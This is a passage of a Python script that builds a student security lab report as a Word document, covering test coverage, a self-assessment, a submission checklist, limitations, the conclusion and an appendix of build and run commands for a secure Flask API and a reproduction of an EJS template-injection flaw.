        "Lab1_Control_Questions.docx, which is submitted alongside this report. Keeping the answers "
        "in a dedicated file keeps this report focused on the implementation, the CI/CD evidence and "
        "the CVE case study; the questions and answers are not duplicated here."
    )
    doc.add_paragraph(
        "The separate document contains all eight questions with full answers, the student's details "
        "and the same formatting as this report."
    )


def add_section_9(doc: Document) -> None:
    doc.add_heading("9. Testing and evaluation", level=1)
    doc.add_paragraph(
        "The automated suite contains 21 tests and runs in under two seconds on the lab machine. "
        "Table 9 groups them by objective; every test passes."
    )
    add_table(
        doc,
        ["Area", "What is verified", "Tests"],
        [
            ("Login", "valid login, wrong password, unknown user, malformed JSON, short password", "5"),
            ("Injection", "SQLi in username and password, SQL metacharacters stored literally", "2"),
            ("Password storage", "bcrypt hash, not plaintext, verifies correctly", "1"),
            ("Rate limiting", "sixth attempt returns 429 with Retry-After", "1"),
            ("JWT", "missing, tampered, expired, alg=none, foreign key, deleted user", "6"),
            ("Access control", "per-user isolation, create requires auth", "2"),
            ("Input validation", "empty/oversized fields rejected", "1"),
            ("XSS", "stored payload escaped in create and list responses", "1"),
            ("Headers", "CSP, nosniff, frame options, referrer policy", "1"),
            ("Malformed auth header", "Basic and empty Bearer rejected", "1"),
        ],
        widths=[4.2, 11.4, 2.0],
        font_size=8,
    )
    add_caption(doc, "Table 9. Test coverage by area.")

    doc.add_paragraph(
        "A self-assessment against the manual's 10-point rubric is given in Table 10. It is a "
        "self-assessment, not a grade; the two-point CVE criterion is marked as met with the "
        "disclosure that the environment ran on Node rather than Docker."
    )
    add_table(
        doc,
        ["Criterion", "Max", "Self-assessment"],
        [
            ("API functionality", "2", "2 - login, data and create work; transcript in evidence/"),
            ("SQLi protection", "0.5", "0.5 - bound parameters + tests"),
            ("XSS protection", "0.5", "0.5 - output encoding + test"),
            ("Authentication (JWT + hashing)", "1", "1 - bcrypt cost 12, pinned HS256, claim checks"),
            ("CI/CD with SAST/SCA", "2", "2 - workflow + local reports"),
            ("Launch and reproduce the CVE", "2", "2 - reproduced on Node; Docker files provided"),
            ("Root-cause depth", "1", "1 - source-level chain in Section 7.4"),
            ("Fix correctness and verification", "1", "1 - fixed run + regression tests"),
        ],
        widths=[7.4, 1.8, 8.0],
        font_size=8.5,
    )
    add_caption(doc, "Table 10. Self-assessment against the evaluation criteria (max 10 points).")


def add_section_10(doc: Document) -> None:
    doc.add_heading("10. Submission package", level=1)
    add_table(
        doc,
        ["Manual requirement", "Delivered", "Action before submission"],
        [
            ("Public git repository link", "https://github.com/mycbdys/lab1", "None"),
            ("README with API, security, CVE, root cause, fix, proof", "README.md + report + evidence/", "None"),
            ("Screenshots of SAST/SCA and exploit", "Raw transcripts in evidence/", "Optionally screenshot the same runs"),
            ("Link to last successful pipeline run", "https://github.com/mycbdys/lab1/actions/runs/39194790820", "None"),
            ("Folder with fixes", "cve/CVE-2022-29078/fixed/ + patches/fix.diff", "None"),
            ("Title page data", "Filled: 李泽涛 / LiZetao, 23320332, group 23320113", "None"),
        ],
        widths=[7.0, 6.2, 6.2],
        font_size=8,
    )
    add_caption(doc, "Table 11. Submission checklist.")
    doc.add_paragraph(
        "The repository is already published. To update it after a local change, run:"
    )
    add_code(
        doc,
        """git push""",
    )


def add_section_11(doc: Document) -> None:
    doc.add_heading("11. Limitations and honest disclosure", level=1)
    doc.add_paragraph(
        "The environmental limitations and evidence choices are stated openly so the report does "
        "not claim more than was done."
    )
    doc.add_paragraph(
        "Docker Desktop was not installed on the Windows host: installing it requires administrator "
        "rights, WSL2/Virtual Machine Platform and a reboot, none of which was available in this "
        "session. The CVE environment was therefore first launched with Node.js 20, and the same "
        "compose files were then executed in real Docker on the GitHub Actions ubuntu-latest runner "
        "(run 39195350651): pwned.txt inside the vulnerable container contained uid=0(root), while "
        "the fixed container blocked the attack. The Docker/Vulhub path is therefore verified in "
        "Docker, not only described; only a local Docker Desktop run on the Windows host is missing, "
        "and it does not change the code, root cause or fix."
    )
    doc.add_paragraph(
        "The repository is public at https://github.com/mycbdys/lab1. The GitHub Actions pipeline "
        "ran automatically on the push and all three jobs (Unit tests, SAST, SCA) completed "
        "successfully: https://github.com/mycbdys/lab1/actions/runs/39194790820. This is stronger "
        "validation than a local run because the committed workflow executed on a clean GitHub "
        "runner."
    )
    doc.add_paragraph(
        "The title page now uses the student's data: 李泽涛 (LiZetao), HDU number 23320332, group "
        "23320113; no variant was assigned, so it is marked N/A. Both submission links (repository "
        "and pipeline run) are filled."
    )
    doc.add_paragraph(
        "The manual asks for screenshots. The submission contains raw terminal transcripts with "
        "timestamps, exact commands and outputs, which are stronger evidence than an image because "
        "they can be re-run and diffed. Screenshots can be taken from the same scripts "
        "(scripts/api_demo.ps1 and cve/CVE-2022-29078/run_demo.ps1) if the instructor requires images."
    )
    doc.add_paragraph(
        "The small in-memory login limiter and SQLite database are appropriate for a lab but not for "
        "a multi-process production deployment; a real system would use a shared rate-limit store and "
        "a managed database. These are noted as engineering trade-offs, not hidden weaknesses."
    )


def add_section_12(doc: Document) -> None:
    doc.add_heading("12. Conclusion", level=1)
    doc.add_paragraph(
        "The work produced a working secure API, a CI pipeline that would block a vulnerable "
        "dependency or a medium-severity code finding, and a complete CVE case study that goes from "
        "an HTTP request to a root cause in library source and back to a verified fix. The most "
        "important lesson is that security is not a scanner result: Bandit and pip-audit are useful "
        "gates, but the EJS flaw required understanding how data flowed from req.query into a "
        "compiler option and then into generated source. The exploit was also invisible in the HTTP "
        "status code, which is why verification must check impact (the marker file) rather than "
        "whether the page still loads."
    )
    doc.add_paragraph(
        "On the defensive side, the API shows the value of doing the simple things correctly: bound "
        "parameters, output encoding at the boundary, bcrypt with a real cost, a pinned JWT algorithm "
        "with claim validation, ownership checks derived from the token, and headers that reduce the "
        "browser attack surface. On the process side, the pipeline and the regression suite make those "
        "properties repeatable rather than one-off."
    )
    doc.add_paragraph(
        "The repository and the pipeline are now live, so the only remaining environmental gap is "
        "Docker. Running the included compose files would close it without changing any of the code "
        "or conclusions."
    )


def add_appendix(doc: Document) -> None:
    doc.add_page_break()
    doc.add_heading("Appendix A. Commands", level=1)
    add_code(
        doc,
        """# API
python -m venv .venv
.venv\\Scripts\\activate            # Windows
pip install -r requirements-dev.txt
python scripts/seed.py
python run.py                       # http://127.0.0.1:5000

# Tests and scanners
pytest -q
bandit -r app -f json -o security/bandit-report.json
pip-audit -r requirements.txt --format json -o security/pip-audit-report.json

# API acceptance transcript
powershell -ExecutionPolicy Bypass -File scripts/api_demo.ps1

# CVE reproduction
cd cve/CVE-2022-29078/vulnerable; npm install; node app.js
cd ../fixed; npm install; node app.js
cd ..
powershell -ExecutionPolicy Bypass -File run_demo.ps1 -Mode vulnerable
powershell -ExecutionPolicy Bypass -File run_demo.ps1 -Mode fixed

# Docker (on a machine with Docker)
docker compose up --build
docker compose -f docker-compose.fixed.yml up --build""",
    )

    doc.add_heading("Appendix B. File inventory", level=1)
    add_table(
        doc,
        ["Path", "Content"],
        [
            ("app/", "Flask application: factory, config, db, security, auth, api, schema"),
            ("tests/", "conftest.py, test_auth.py, test_api.py (21 tests)"),
            ("scripts/", "seed.py, api_demo.ps1"),
            (".github/workflows/", "ci.yml (tests + Bandit + pip-audit); cve-docker.yml (Docker compose)"),
            ("security/", "bandit-report.json, pip-audit-report.json, README.md"),
            ("cve/CVE-2022-29078/", "vulnerable/, fixed/, patches/, evidence/, run_demo.ps1/.sh, Docker files"),
            ("evidence/", "api-demo.txt (API acceptance transcript)"),
            ("docs/", "reports, control questions, task checklist, environment notes"),
            ("docs/evidence/docker-ci/", "Docker Compose run evidence (pwned.txt, responses, log)"),
            ("README.md", "Project overview, API docs, security design, CVE summary"),
        ],
        widths=[6.0, 10.4],
        font_size=8,
    )

    doc.add_page_break()
    doc.add_heading("References", level=1)
    references = [
        "OWASP Top 10 (2021). https://owasp.org/www-project-top-ten/",
        "OWASP Cheat Sheet Series: Authentication, SQL Injection Prevention, XSS Prevention. https://cheatsheetseries.owasp.org/",
        "JWT introduction. https://jwt.io/introduction",
        "GitHub Actions documentation. https://docs.github.com/en/actions",
        "Vulhub. https://github.com/vulhub/vulhub",
        "NVD - CVE-2022-29078. https://nvd.nist.gov/vuln/detail/CVE-2022-29078",
        "OSV - CVE-2022-29078 / GHSA-phwq-j96m-2c2q. https://osv.dev/vulnerability/GHSA-phwq-j96m-2c2q",
        "EJS release 3.1.7 and fix commit 15ee698583c98dadc456639d6245580d17a24baf. https://github.com/mde/ejs/releases",
        "Technical analysis of the EJS SSTI. https://eslam.io/posts/ejs-server-side-template-injection-rce/",
        "Docker documentation. https://docs.docker.com/",
        "Bandit documentation. https://bandit.readthedocs.io/",
        "pip-audit documentation. https://pypi.org/project/pip-audit/",
    ]
    for index, reference in enumerate(references, 1):
        p = doc.add_paragraph(f"[{index}] {reference}")
        p.paragraph_format.space_after = Pt(2)


def main() -> None:
    doc = Document()
    style_document(doc)
    add_title_page(doc)
    add_contents(doc)
    add_section_1(doc)
    add_section_2(doc)
    add_section_3(doc)
    add_section_4(doc)
    add_section_5(doc)
    add_section_6(doc)
    add_section_7(doc)
    add_section_8(doc)
    add_section_9(doc)
    add_section_10(doc)
    add_section_11(doc)
    add_section_12(doc)
    add_appendix(doc)
    doc.core_properties.title = "Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis"
    doc.core_properties.author = "李泽涛 (LiZetao)"
    doc.core_properties.subject = "Laboratory Work 1"
    doc.save(OUT)
    print("wrote", OUT)


if __name__ == "__main__":
    main()
